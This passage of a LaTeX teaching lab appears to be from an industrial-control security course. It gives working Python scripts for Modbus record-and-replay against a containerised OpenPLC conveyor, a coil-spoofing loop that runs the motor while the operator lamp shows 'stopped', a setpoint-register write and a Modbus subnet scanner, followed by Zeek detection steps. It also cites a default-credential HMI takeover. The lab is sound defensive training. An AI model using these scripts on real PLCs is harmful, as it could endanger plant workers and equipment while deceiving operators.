\textit{Expected output (idle plant -- motor off, lamp off, stop and
both guards engaged):}
\begin{lstlisting}
coils 0..7  : [False, False, ..., False, False]
discrete 0.7: [False, True, True, True, False, False, False, False]
\end{lstlisting}
Mapping (from \texttt{conveyor.st}):
\begin{itemize}\setlength{\itemsep}{1pt}
  \item \texttt{\%IX0.0} Start button -- discrete input 0
  \item \texttt{\%IX0.1} Stop button (normally closed) -- discrete input 1
  \item \texttt{\%IX0.2}/\texttt{\%IX0.3} Guard1/Guard2 -- discrete inputs 2--3
  \item \texttt{\%QX0.0} Motor output -- coil 0
  \item \texttt{\%QX0.1} Lamp (operator-visible) -- coil 1
\end{itemize}
\end{stepbox}

\begin{stepbox}{2.2 -- Sample the plant for 60 seconds}
Run a steady poll so that (a) you have a baseline log and (b) Zeek
sees a long stretch of legitimate traffic to contrast the attack
with:
\begin{lstlisting}[language=bash]
docker compose exec -d student python3 /labs/scripts/modbus_poll_loop.py
sleep 60
docker compose exec student pkill -f modbus_poll_loop
\end{lstlisting}
This is the same poll a SCADA HMI would produce -- one request every
two seconds, function code 3 (\textit{Read Holding Registers}).
Defenders use exactly this kind of long-running poll to build the
``known-good'' profile that detection rules then match against
(see Lab 08).
\end{stepbox}

% --------------------------------------------------------------------
\section*{Part 3 -- Record-and-replay attack}

\begin{stepbox}{3.1 -- Capture 60 seconds of Modbus}
Open a second shell into the student container and capture traffic
on the PLC subnet while the poll loop from 2.2 runs:
\begin{lstlisting}[language=bash]
docker compose exec -d student tcpdump -i eth0 \
  -w /labs/captures/lab05.pcap port 502
docker compose exec -d student \
  python3 /labs/scripts/modbus_poll_loop.py
sleep 60
docker compose exec student pkill -INT tcpdump
docker compose exec student pkill -f modbus_poll_loop
\end{lstlisting}
The PCAP lands on the host at
\texttt{bachelor/labs/\_stack/}\allowbreak\texttt{captures/lab05.pcap} thanks to the
volume mount.

Confirm you got real Modbus frames:
\begin{lstlisting}[language=bash]
tshark -r bachelor/labs/_stack/captures/lab05.pcap -Y modbus | head
\end{lstlisting}
\textit{Expected output (abridged):}
\begin{lstlisting}
172.28.0.20 -> 172.28.0.10  Modbus Query:    Func 3 (Read Holding)
172.28.0.10 -> 172.28.0.20  Modbus Response: Func 3 (Read Holding)
\end{lstlisting}
\end{stepbox}

\begin{stepbox}{3.2 -- Replay the capture from Python}
The student container does not ship \texttt{tcpreplay} (and a raw
L2 replay would not survive Docker's bridge anyway), so we replay
at the \emph{application} layer: open a fresh TCP connection to
the PLC and shove the Modbus PDUs back at it in order. This is
what an attacker would do from a foothold inside the OT zone --
no special privileges required.

Save the following helper into the container and run it:
\begin{lstlisting}[language=bash]
docker compose exec student bash -c 'cat >/tmp/replay.py <<"PY"
import socket, sys, time
from scapy.all import rdpcap, Raw, TCP
pkts = rdpcap("/labs/captures/lab05.pcap")
mbap_pdus = []
for p in pkts:
    if TCP in p and Raw in p and p[TCP].dport == 502:
        mbap_pdus.append(bytes(p[Raw].load))
print(f"replaying {len(mbap_pdus)} Modbus PDUs")
s = socket.create_connection(("172.28.0.10", 502), timeout=2)
for i, pdu in enumerate(mbap_pdus):
    s.sendall(pdu)
    try:
        s.recv(4096)
    except socket.timeout:
        pass
    if i % 10 == 0:
        print(f"  sent {i+1}/{len(mbap_pdus)}")
    time.sleep(0.05)
s.close()
print("done")
PY
pip3 install --break-system-packages --quiet scapy \
    >/dev/null 2>&1 || true
python3 /tmp/replay.py'
\end{lstlisting}
\textit{Expected output (abridged):}
\begin{lstlisting}
replaying 30 Modbus PDUs
  sent 1/30
  sent 11/30
  sent 21/30
done
\end{lstlisting}
Open the HMI at \url{http://127.0.0.1:8080} and watch the Monitoring
page. The replay produces \emph{exactly} the request pattern of a
normal poll -- because that is what it is. Nothing the wire shows is
``malicious'' on its own.

\emph{Real-world anchor:} this is the same trick Stuxnet used for
its 21-second HMI deception window. The malware did not invent
sensor readings; it played back ones it had previously recorded.
The packets were genuine. Only the \emph{timing} was a lie.
\end{stepbox}

% --------------------------------------------------------------------
\section*{Part 4 -- Set-point spoofing with operator deception}

The replay above proves that an attacker can produce
indistinguishable-from-normal traffic. Now we use that cover to do
something that actually moves the plant.

\begin{stepbox}{4.1 -- Drive the motor while the operator HMI lies}
The conveyor ladder is \texttt{Motor := (Start OR Motor) AND Stop
AND Guard1 AND Guard2; Lamp := Motor;}. In a clean plant, the lamp
follows the motor -- the operator sees the lamp on \emph{iff} the
motor is on. We will break that invariant by writing both coils
from the outside.

Why this matters in plain IT terms: the ladder runs every 20\,ms
and updates \texttt{Motor} from inputs, then \texttt{Lamp} from
\texttt{Motor}. A Modbus write directly to coil~1 (Lamp) is
overwritten on the next scan -- so a single write would be
visible only for $<20$\,ms. But if we hold a steady stream of
writes, we can pin the Lamp to a value of our choosing for as
long as we like, while the actual Motor coil tells the truth on
the I/O bus.

Run the spoofing loop:
\begin{lstlisting}[language=bash]
docker compose exec student bash -c 'cat >/tmp/spoof.py <<"PY"
import time
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient("172.28.0.10", port=502); c.connect()
# 1) Trigger the dangerous condition: pulse the Start input via coil
#    forcing on QX0.0 directly (override the ladder output).
# 2) Simultaneously hold Lamp (coil 1) to FALSE so the operator
#    HMI keeps showing "stopped".
t_end = time.time() + 30
n = 0
while time.time() < t_end:
    c.write_coil(address=0, value=True,  slave=1)   # Motor ON
    c.write_coil(address=1, value=False, slave=1)   # Lamp OFF (lie)
    n += 1
    time.sleep(0.05)
c.close()
print(f"wrote {n} pairs in 30 s")
PY
python3 /tmp/spoof.py'
\end{lstlisting}
While that runs (30~seconds), refresh the OpenPLC
\emph{Monitoring} page at \url{http://127.0.0.1:8080}. Watch the
\texttt{Motor (\%QX0.0)} and \texttt{Lamp (\%QX0.1)} values. With a
fast-enough write loop, you should see them disagree for stretches
of time -- the motor reports ON, the lamp reports OFF, even though
the ladder source code says they must be equal.

\textit{Expected output:}
\begin{lstlisting}
wrote 600 pairs in 30 s
\end{lstlisting}
\emph{Real-world anchor:} this is the small Industroyer move
(2016, Pivnichna substation). The Industroyer IEC-101/104 modules
sent legitimate-looking control commands; from the protocol's
point of view nothing was wrong. The damage was in \emph{what} the
commands asked for, not in \emph{how} they were framed.
\end{stepbox}

\begin{stepbox}{4.2 -- A safer setpoint analogue}
In a plant with an analogue setpoint (motor RPM, valve position,
furnace temperature) the attacker writes the \emph{target} value
into one holding register and the \emph{displayed} value into
another. The operator dashboard reads only the displayed register.

OpenPLC exposes holding registers 0--1023; the conveyor ladder
does not use them. Use this as a thought experiment: write 9000
(``RPM target far above safe band'') into register~0 and 1500
(``healthy RPM'') into register~1, then ask yourself which one the
HMI in front of you would have plotted.
\begin{lstlisting}[language=bash]
python3 - <<'PY'
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient("172.28.0.10", port=502); c.connect()
c.write_register(address=0, value=9000, slave=1)   # "target"
c.write_register(address=1, value=1500, slave=1)   # "displayed"
print(c.read_holding_registers(0, count=2, slave=1).registers)
c.close()
PY
\end{lstlisting}
\textit{Expected output:}
\begin{lstlisting}
[9000, 1500]
\end{lstlisting}
\end{stepbox}

% --------------------------------------------------------------------
\section*{Part 5 -- Detection: find your own attack in Zeek}

The Zeek service in this stack shares OpenPLC's network namespace
(see \texttt{docker-compose.yml}), so it sees every packet
in and out of the PLC -- which is exactly the position a SOC's
network sensor would occupy if it were tapped onto the OT switch.

\begin{stepbox}{5.1 -- List what Zeek captured}
On the host (not in the student container):
\begin{lstlisting}[language=bash]
ls bachelor/labs/_stack/zeek-logs/
\end{lstlisting}
\textit{Expected output (relevant files):}
\begin{lstlisting}
conn.log
modbus.log
notice.log
\end{lstlisting}
\begin{itemize}\setlength{\itemsep}{1pt}
  \item \texttt{conn.log} -- one line per TCP/UDP flow, protocol-agnostic.
  \item \texttt{modbus.log} -- one line per Modbus request/response pair,
        with the function code resolved.
  \item \texttt{notice.log} -- one line per high-signal event. The
        rule in \texttt{zeek/local.zeek} raises a notice on every
        Modbus \emph{write} (function codes 5, 6, 15, 16).
\end{itemize}
\end{stepbox}

\begin{stepbox}{5.2 -- Pinpoint the malicious writes}
Modbus reads are function code 3; writes are function codes 5, 6,
15 or 16. Pull only the writes from the spoofing window:
\begin{lstlisting}[language=bash]
jq -c 'select(.func | test("WRITE"))' \
   bachelor/labs/_stack/zeek-logs/modbus.log | head
\end{lstlisting}
\textit{Expected output (abridged):}
\begin{lstlisting}
{"ts":...,"id.orig_h":"172.28.0.20","id.resp_h":"172.28.0.10",
 "unit_id":1,"func":"WRITE_SINGLE_COIL","exception":null}
{"ts":...,"id.orig_h":"172.28.0.20","id.resp_h":"172.28.0.10",
 "unit_id":1,"func":"WRITE_SINGLE_COIL","exception":null}
\end{lstlisting}
And the notice:
\begin{lstlisting}[language=bash]
tail bachelor/labs/_stack/zeek-logs/notice.log
\end{lstlisting}
\textit{Expected output (abridged):}
\begin{lstlisting}
{"note":"ModbusWatch::Unsolicited_Write",
 "msg":"Modbus write from 172.28.0.20 to 172.28.0.10 (FC=5)", ... }
\end{lstlisting}
Convert the Unix epoch in the \texttt{ts} field to a human
timestamp:
\begin{lstlisting}[language=bash]
jq -r '.ts' bachelor/labs/_stack/zeek-logs/notice.log | head -1 \
  | xargs -I{} date -d @{} '+%H:%M:%S'
\end{lstlisting}
This is the timestamp you would hand to the on-call analyst.
\end{stepbox}

\begin{stepbox}{5.3 -- Was the \emph{replay} from Part~3 detected?}
Re-examine \texttt{modbus.log} \emph{without} the
\texttt{WRITE} filter. The replay traffic is plain
\texttt{READ\_HOLDING\_REGISTERS} -- function code 3 -- so it slips
past the write-only notice rule completely. To catch the replay
you would need a behaviour rule, not a protocol rule: ``the same
client opens a fresh TCP session and sends the exact same
sequence of transaction IDs we saw an hour ago.''

\emph{Real-world anchor:} this is the exact gap that lets
Volt Typhoon's living-off-the-land operators stay invisible for
years -- nothing they do violates a protocol-level signature;
detection has to be behavioural (CISA \emph{AA24-038A},
7~Feb 2024).
\end{stepbox}

% --------------------------------------------------------------------
\section*{Part 6 -- Stretch: Conpot-style scanner}

\begin{stepbox}{6.1 -- Optional: write a mini-Shodan}
For groups that finish early. Build a one-file scanner that walks
the \texttt{172.28.0.0/24} subnet, finds anything listening on
port~502, asks each device for its Modbus identification, and
prints a report. This is, in miniature, what Shodan does
continuously against the whole IPv4 Internet.
\begin{lstlisting}[language=bash]
docker compose exec student bash -c 'cat >/tmp/mini_shodan.py <<"PY"
import ipaddress, socket
from pymodbus.client import ModbusTcpClient
from pymodbus.mei_message import ReadDeviceInformationRequest
SUBNET = "172.28.0.0/24"
for ip in ipaddress.ip_network(SUBNET).hosts():
    ip = str(ip)
    s = socket.socket(); s.settimeout(0.2)
    try:
        s.connect((ip, 502))
    except Exception:
        continue
    finally:
        s.close()
    c = ModbusTcpClient(ip, port=502, timeout=1); c.connect()
    rr = c.execute(ReadDeviceInformationRequest(unit=1))
    vendor = product = rev = "?"
    if not rr.isError():
        info = getattr(rr, "information", {}) or {}
        vendor  = (info.get(0) or b"?").decode(errors="replace")
        product = (info.get(1) or b"?").decode(errors="replace")
        rev     = (info.get(2) or b"?").decode(errors="replace")
    print(f"{ip:15s}  502/tcp open  modbus  "
          f"vendor={vendor!r} product={product!r} rev={rev!r}")
    c.close()
PY
python3 /tmp/mini_shodan.py'
\end{lstlisting}
\textit{Expected output (one line, give or take):}
\begin{lstlisting}
172.28.0.10  502/tcp open  modbus
   vendor='Unknown' product='OpenPLC' rev='1.0'
\end{lstlisting}
\emph{Real-world anchor:} Conpot is a low-interaction ICS
honeypot; Shodan indexes results that look like this from the
public Internet. CyberAv3ngers (2023) is the canonical example
of a low-skill actor weaponising exactly this output -- scan
\texttt{port:20256}, log in with \texttt{1111}, deface the HMI.
\end{stepbox}

% --------------------------------------------------------------------
\section*{Bring the stack down}

\begin{stepbox}{Cleanup}
\begin{lstlisting}[language=bash]
cd bachelor/labs/_stack
docker compose down -v
\end{lstlisting}
\texttt{-v} removes the named volumes so the next lab starts from a
clean slate.
\end{stepbox}

% --------------------------------------------------------------------
\begin{deliverbox}
Hand in a single PDF / markdown file containing:
\begin{enumerate}\setlength{\itemsep}{1pt}
  \item The nmap output from Step~1.1 with the open ports highlighted.
  \item The baseline coil/register read from Step~2.1.
  \item The first 10 lines of \texttt{modbus.log} during the replay
        (Part~3) -- annotate the function code.
  \item One screenshot of the OpenPLC \emph{Monitoring} page during
        the spoofing run (Step~4.1) showing the
        Motor/Lamp disagreement (or, if you missed the window, a
        short explanation of why timing matters and how a real HMI
        polling at 1\,Hz would have shown the lie).
  \item The \texttt{notice.log} excerpt from Step~5.2 with the
        human-readable timestamp of the first malicious write.
  \item A 5-line answer to: \emph{Which of the three Stuxnet shapes
        (replay, set-point spoofing, write-while-display-lies) would
        a protocol-only IDS like the one in
        \texttt{zeek/local.zeek} miss? What would you add?}
  \item (Stretch, optional) The output of your mini-Shodan scanner.
\end{enumerate}
\end{deliverbox}

% --------------------------------------------------------------------
\begin{warnbox}
\textbf{Authorisation reminder.} Every command in this lab is legal
because the target is a container you started, on a private bridge
network on your own host. The instant the destination changes --
even to a friend's PLC, even with permission given verbally --
you need written authorisation and a scoped engagement. For OT in
particular, also make sure a process engineer is in the loop:
\emph{Modbus has no rollback.} A write commits the moment the PLC
acknowledges it.
\end{warnbox}

\end{document}
